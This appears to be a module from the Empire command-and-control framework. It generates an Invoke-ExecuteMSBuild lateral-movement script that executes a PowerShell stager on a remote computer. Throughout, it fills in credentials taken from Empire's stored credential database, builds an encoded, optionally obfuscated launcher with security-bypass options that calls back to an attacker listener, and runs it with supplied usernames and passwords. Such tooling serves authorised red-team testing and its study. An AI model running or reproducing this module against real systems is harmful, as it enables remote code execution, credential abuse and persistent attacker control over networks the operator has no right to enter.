from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        command = params["Command"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        script_end = "Invoke-ExecuteMSBuild"
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    raise ModuleValidationException("CredID is invalid!")

                if cred.domain != "":
                    params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
                else:
                    params["UserName"] = str(cred.username)
                if cred.password != "":
                    params["Password"] = cred.password

        # Only "Command" or "Listener" but not both
        if listener_name == "" and command == "":
            raise ModuleValidationException("Listener or Command required")
        if listener_name and command:
            raise ModuleValidationException(
                "[!] Cannot use Listener and Command at the same time"
            )

        if (
            not main_menu.listenersv2.get_active_listener_by_name(listener_name)
            and not command
        ):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: " + listener_name)

        if listener_name:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )
            if launcher == "":
                raise ModuleValidationException("Error in launcher generation.")

            launcher = launcher.replace("$", "`$")
            script = script.replace("LAUNCHER", launcher)
        else:
            Cmd = command.replace('"', '`"').replace("$", "`$")
            script = script.replace("LAUNCHER", Cmd)

        # add any arguments to the end execution of the script
        script_end += " -ComputerName " + params["ComputerName"]

        if params["UserName"] != "":
            script_end += (
                ' -UserName "'
                + params["UserName"]
                + '" -Password "'
                + params["Password"]
                + '"'
            )

        if params["DriveLetter"]:
            script_end += ' -DriveLetter "' + params["DriveLetter"] + '"'

        if params["FilePath"]:
            script_end += ' -FilePath "' + params["FilePath"] + '"'

        script_end += " | Out-String"

        return script, script_end
